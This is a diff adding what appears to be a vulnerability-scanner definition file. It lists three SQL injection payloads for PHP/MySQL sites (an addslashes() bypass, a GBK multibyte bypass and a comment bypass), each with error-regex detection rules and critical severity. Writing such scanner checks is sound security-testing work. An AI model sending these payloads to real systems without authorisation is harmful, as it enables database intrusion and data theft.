@@ -1,0 +1,27 @@
+id: sqli-php
+name: SQL injection — PHP-specific bypasses
+context:
+  powered_by: ["PHP"]
+  server: ["Apache"]
+
+payloads:
+  - value: "\\' OR 1=1--"
+    detect: { body_regex: "syntax|error|mysql" }
+    id: sqli-php-addslashes
+    title: "SQL injection — PHP addslashes() bypass"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "%bf%27 OR 1=1--"
+    detect: { body_regex: "syntax|error|mysql" }
+    id: sqli-php-gbk
+    title: "SQL injection — GBK multibyte encoding bypass"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "' OR '1'='1'/*"
+    detect: { status_change: true }
+    id: sqli-php-comment
+    title: "SQL injection — MySQL comment bypass"
+    severity: critical
+    cwe: CWE-89
